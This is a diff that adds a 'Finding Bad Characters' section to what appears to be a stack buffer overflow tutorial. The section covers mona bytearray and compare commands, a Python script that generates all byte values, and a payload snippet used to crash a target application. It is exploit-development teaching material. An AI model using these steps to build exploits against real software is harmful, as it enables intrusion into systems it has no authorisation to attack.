@@ -225,3 +225,34 @@ buffer = prefix + overflow + retn + padding + payload + postfix
     
 ## Finding Bad Characters
     
+We need to see which characters will be corrupted. To do this we will generate a byte array of all possible characters using mona, and a matching byte array using python.
+    
+ To generate bytearray.bin in the current directory in mona (and exclude the null byte `\x00`)
+ ```
+ !mona bytearray -b "\x00"
+ ```
+ To create a bytearray.py that we can use for find_bad_chars.py script
+    
+ ```python
+ #!/usr/bin/env python
+from __future__ import print_function
+
+for x in range(1, 256):
+    print("\\x" + "{:02x}".format(x), end='')
+
+print()   
+ ```
+ 
+To then create find_bad_chars.py with this info
+ 
+ ```python
+ badchars = "\x01\x02\x03\x04\x05...\xfb\xfc\xfd\xfe\xff"
+payload = badchars + "C" * (600-112-4-255)
+ ```
+Crash the application using this buffer, and make a note of the address to which ESP points. This can change every time you crash the application, so get into the habit of copying it from the register each time.
+
+Use the mona compare command to reference the bytearray you generated, and the address to which ESP points:
+
+```
+!mona compare -f C:\mona\appname\bytearray.bin -a <address>
+```
